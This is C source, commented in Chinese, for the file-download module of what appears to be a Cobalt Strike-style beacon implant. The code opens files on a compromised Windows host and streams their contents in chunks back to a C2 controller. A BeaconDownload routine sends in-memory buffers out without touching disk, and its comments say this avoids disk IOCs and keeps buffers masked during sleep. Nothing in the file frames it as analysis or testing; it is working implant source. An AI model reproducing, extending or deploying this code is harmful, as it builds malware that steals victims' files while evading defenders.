#include <stdlib.h>
#include "syscalls.h"
#include <stdio.h>
#include <windows.h>
#include "commands.h"
#include "parse.h"
#include "bformat.h"
#include "beacon.h"
#include "track_memory.h"
#include <WinSock2.h>

typedef struct {
	unsigned int    id;
	unsigned int    toread;
	HANDLE handle; /* Win32 句柄：瘦身——拔掉 CRT stdio 文件 I/O 链。
	                  内存下载路径（BeaconDownload）handle 恒为 NULL。 */
	char * mem;    /* 4.12 BeaconDownload：beacon 自持的缓冲副本（NULL=文件路径） */
	unsigned int mempos; /* 内存路径：已发出的字节数 */
 	void * next;
} file_entry;

/* 退出清理兜底：关句柄 + 清零 + 释放（download_poll 的正常路径会先 remove 再 free） */
static void download_entry_cleanup(void * p) {
	file_entry * entry = (file_entry *)p;
	if (entry->handle != NULL && entry->handle != INVALID_HANDLE_VALUE)
		beacon_CloseHandle(entry->handle);
	if (entry->mem != NULL) {
		track_memory_remove(entry->mem);
		free(entry->mem);
		entry->mem = NULL;
	}
	memset(entry, 0, sizeof(file_entry));
	free(entry);
}

/* 内存条目的登记/释放小助手：copy 已 track_memory_add 过（掩码诉求） */
static void download_entry_drop(file_entry * entry) {
	track_memory_remove(entry);
	if (entry->mem != NULL) {
		track_memory_remove(entry->mem);
		free(entry->mem);
		entry->mem = NULL;
	}
	free(entry);
}

/* 跟踪我们的套接字 */
static file_entry * download_list = NULL; /* 条目均登记 track_memory；退出时由 track_memory_cleanup 兜底释放 */

/* 跟踪下载标识符 */
static unsigned int download_id = 0;

/* 用于读取文件的共享缓冲区 */
static char * read_buffer = NULL;        /* 已登记 track_memory，退出时清零并释放 */

/* 我们需要在几个关键位置执行此操作！ */
void process_close(file_entry * entry, void(*callback)(char * buffer, int length, int type));

/* 下载一些内容 */
void command_download(char * buffer, int length, void (*callback)(char * data, int length, int type)) {
	file_entry * entry = NULL;
	HANDLE infile;
	char * fname;				/* 用户提供的文件名 */
	char * fullname;			/* 文件的完整路径 */
	__int64      fsz;
	unsigned int nsz;

	datap * chunk;

	datap   parser;
	formatp builder;

	/* 分配所需内存 */
	chunk    = data_alloc(4096);
	fname    = data_ptr(chunk, 2048);
	fullname = data_ptr(chunk, 2048);

	/* 确定文件名 */
	data_init(&parser, buffer, length);
	data_string_oneoff(&parser, fname, 2048);

	/* 打开文件以供读取 */
	infile = beacon_CreateFileA(fname, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (infile == INVALID_HANDLE_VALUE || infile == NULL) {
		post_error_s(0x28, fname);
		data_free(chunk);
		return;
	}

	/* 计算文件大小（存储在fsz中） */
	{
		LARGE_INTEGER li;
		if (!GetFileSizeEx(infile, &li))
			fsz = 0;
		else
			fsz = li.QuadPart;
	}

	/* 如果这部分失败，请向用户报告错误 */
	if (fsz <= 0 || fsz > 0xffffffffLL) {
		post_error_s(0x3c, fname);
		data_free(chunk);
		beacon_CloseHandle(infile);
		return;
	}

	/* 获取文件的完整路径 */
	nsz = GetFullPathNameA(fname, 2048, fullname, NULL);
	if (nsz == 0 || nsz > 2048) {
		post_error_s(0x3d, fname);
		data_free(chunk);
		beacon_CloseHandle(infile);
		return;
	}

	/* 创建新的下载条目（现在是个好时机） */
/* 此条目在download_pull()中完全处理或停止后释放 */
	entry = (file_entry *)malloc(sizeof(file_entry));
	entry->handle = infile;
	entry->id     = download_id;
	entry->toread = fsz;
	entry->next   = download_list;
	download_list = entry;

	/* 登记进退出清理（track_memory_cleanup 在 safe_exit 中执行）：
	   若 beacon 在下载未完成时退出，条目与文件句柄由 download_entry_cleanup 兜底。 */
	track_memory_add(entry, sizeof(file_entry), TRACK_MEMORY_CLEANUP_FUNC, FALSE, download_entry_cleanup);

	/* 递增ID，使每个文件下载获得唯一标识符 */
	download_id++;

	/* CALLBACK_FILE
 *   int4             = 下载标识符
 *   int4             = 文件大小
 *   char[..length..] = 文件名（完整路径）
 */
	bformat_init(&builder, 4096);
	bformat_int(&builder, entry->id);
	bformat_int(&builder, fsz);
	bformat_copy(&builder, fullname, nsz);

	/* 发送数据... */
	callback(bformat_string(&builder), bformat_length(&builder), CALLBACK_FILE);

	/* 清理资源 */
	bformat_free(&builder);
	data_free(chunk);

	/* 检查是否已经完成... */
	if (fsz == 0)
		process_close(entry, callback);
}

void process_download(file_entry * entry, void (*callback)(char * buffer, int length, int type), int max) {
	unsigned int temp;
	unsigned int len = 0;
	unsigned int readme = 0;

	/* 确保我们有一个读取缓冲区...我们的下载需要它 */
	if (read_buffer == NULL) {
		read_buffer = (char *)malloc(MAX_PACKET + 4);
		/* 退出时由 track_memory_cleanup 清零并释放（原 TODO 遗留的退出泄漏） */
		track_memory_add(read_buffer, MAX_PACKET + 4, TRACK_MEMORY_MALLOC, FALSE, NULL);
	}

	/* 将下载ID复制到读取缓冲区 */
	temp = htonl(entry->id);
	memcpy(read_buffer, (char *)&temp, 4);

	/* 4.12 BeaconDownload：内存缓冲路径——无句柄，直接从自持副本流式送出 */
	if (entry->handle == NULL && entry->mem != NULL) {
		readme = (entry->toread > (unsigned int)max) ? (unsigned int)max : entry->toread;
		memcpy(read_buffer + 4, entry->mem + entry->mempos, readme);
		len                  = readme;
		entry->toread       -= readme;
		entry->mempos       += readme;

		callback(read_buffer, len + 4, CALLBACK_FILE_WRITE);
		process_close(entry, callback);
		return;
	}
	if (entry->handle == NULL) {
		/* 无句柄也无缓冲：异常条目，按完成处理防死循环 */
		entry->toread = 0;
		process_close(entry, callback);
		return;
	}

	/* 我们想要读取多少数据？ */
	if (entry->toread > max) {
		readme = max;
	}
	else {
		readme = entry->toread;
	}

	/* 如果有大量数据要读取，尽可能多地读取 */
	while (readme > 0) {
		if (!beacon_ReadFile(entry->handle, read_buffer + 4 + len, readme, (DWORD *)&temp, NULL))
			temp = 0;
		/* 检查文件下载过程中是否发生错误...这很重要，因为如果不捕获这个错误，
           会导致无限循环。C2控制器需要对CALLBACK_FILE_CLOSE作出反应，
           以检查接收数据<大小并推断发生了错误 */
		if (temp == 0) {
			entry->toread = 0;
			break;
		}
		len += temp;
		readme -= temp;
		entry->toread -= temp;
	}

	/* 将所有数据发送回家 */
	callback(read_buffer, len + 4, CALLBACK_FILE_WRITE);

	/* 如果需要则关闭文件 */
	process_close(entry, callback);
}

void process_close(file_entry * entry, void(*callback)(char * buffer, int length, int type)) {
	/* 处理这个... */
	unsigned int temp;

	/* 如果需要则关闭文件 */
	if (entry->toread <= 0) {
		temp = htonl(entry->id);
		callback((char *)&temp, 4, CALLBACK_FILE_CLOSE);
		if (entry->handle != NULL && entry->handle != INVALID_HANDLE_VALUE) {
			beacon_CloseHandle(entry->handle);
			entry->handle = INVALID_HANDLE_VALUE; /* 已关闭；置位供 cleanup 判定，防双重关闭 */
		}
	}
}

void command_download_stop(char * buffer, int length) {
	unsigned int fid;
	file_entry * entry = download_list;

	if (length < 4)
		return;

	/* 将4字节复制到我们的文件ID */
	memcpy(&fid, buffer, 4);
	fid = ntohl(fid);

	while (entry != NULL) {
		if (entry->id == fid) {
			/* 使我们不再处理这个文件下载 */
			entry->toread = 0;

			/* 请关闭句柄 */
			beacon_CloseHandle(entry->handle);
			entry->handle = INVALID_HANDLE_VALUE;
		}
		entry = (file_entry*)entry->next;
	}
}

/* 轮询打开的文件。读取一些数据。发送给客户端 */
void download_poll(void (*callback)(char * buffer, int length, int type), int max) {
	file_entry * entry = download_list;
	file_entry * prev  = NULL;

	/* 处理下载 */
	while (entry != NULL) {
		if (entry->toread > 0) {
			process_download(entry, callback, max);
		}
		entry = (file_entry*)entry->next;
	}

	/* 请清理我们的链表 */
	entry = download_list;
	while (entry != NULL) {
		if (entry->toread <= 0) {
			if (prev == NULL) {
				download_list = (file_entry*)entry->next;
				download_entry_drop(entry); /* 正常路径释放前已注销，防退出时二次释放 */
				entry = NULL;
			}
			else {
				prev->next = entry->next;
				download_entry_drop(entry);
				entry = (file_entry*)prev->next;
			}
		}
		else {
			prev  = entry;
			entry = (file_entry*)entry->next;
		}
	}
}

/* ---------------------------------------------------------------------------
 * 4.12 BeaconDownload BOF API (tier-3 item 9)
 *
 *   BOOL BeaconDownload(const char *filename, const char *buffer,
 *                       unsigned int length);
 *
 * 官方契约（4.12 手册 BOF C API 节）：
 *   - 把一段内存缓冲经 beacon 原生下载通道回传（View -> Downloads 查看），
 *     免落盘 IOC；
 *   - beacon 会自行拷贝缓冲，BOF 返回后可安全释放原内存继续执行；
 *   - 缓冲在睡眠期由 sleepmask 掩蔽（这里通过 track_memory 的堆登记实现，
 *     与官方 "The Sleepmask masks the buffer whilst Beacon is sleeping" 对齐）；
 *   - 上限 2GB。
 * wire 帧与磁盘下载完全一致：CALLBACK_FILE 首帧 [id][size][filename]、
 * CALLBACK_FILE_WRITE 分块 [4B BE id][data]、CALLBACK_FILE_CLOSE [4B BE id]，
 * 客户端 BeaconDownloads 无差别收包拼装。
 * --------------------------------------------------------------------------- */
BOOL beacon_download_buffer(const char * filename, const char * buffer, unsigned int length) {
	file_entry * entry;
	char       * copy;
	unsigned int fnlen;
	formatp      builder;
	char       * out;
	int          outlen;
	extern void  command_shell_callback(char * buffer, int length, int type);

	if (filename == NULL || filename[0] == '\0')
		return FALSE;
	if (length > 0x7FFFFFFF) /* 官方 2GB 上限 */
		return FALSE;
	if (length > 0 && buffer == NULL)
		return FALSE;

	/* beacon 自持副本：BOF 原缓冲可立即释放（官方契约） */
	copy = NULL;
	if (length > 0) {
		copy = (char *)malloc(length);
		if (copy == NULL)
			return FALSE;
		memcpy(copy, buffer, length);
		/* 登记 track_memory：退出兜底 + 睡眠期掩蔽 */
		track_memory_add(copy, length, TRACK_MEMORY_MALLOC, TRUE, NULL);
	}

	entry = (file_entry *)malloc(sizeof(file_entry));
	if (entry == NULL) {
		if (copy != NULL) {
			track_memory_remove(copy);
			free(copy);
		}
		return FALSE;
	}

	entry->handle = NULL;    /* 内存路径标记 */
	entry->mem    = copy;
	entry->mempos = 0;
	entry->toread = length;
	entry->id     = download_id;
	entry->next   = download_list;
	download_list = entry;
	track_memory_add(entry, sizeof(file_entry), TRACK_MEMORY_CLEANUP_FUNC, FALSE, download_entry_cleanup);
	download_id++;

	/* 首帧：[id][size][filename]，与 command_download 相同形状 */
	fnlen = (unsigned int)strlen(filename);
	bformat_init(&builder, 256 + fnlen);
	bformat_int(&builder, entry->id);
	bformat_int(&builder, length);
	bformat_copy(&builder, (char *)filename, fnlen);

	out = bformat_string(&builder);
	outlen = bformat_length(&builder);
	command_shell_callback(out, outlen, CALLBACK_FILE);
	bformat_free(&builder);

	/* 零长度下载立即收尾（空文件） */
	if (length == 0)
		process_close(entry, command_shell_callback);

	return TRUE;
}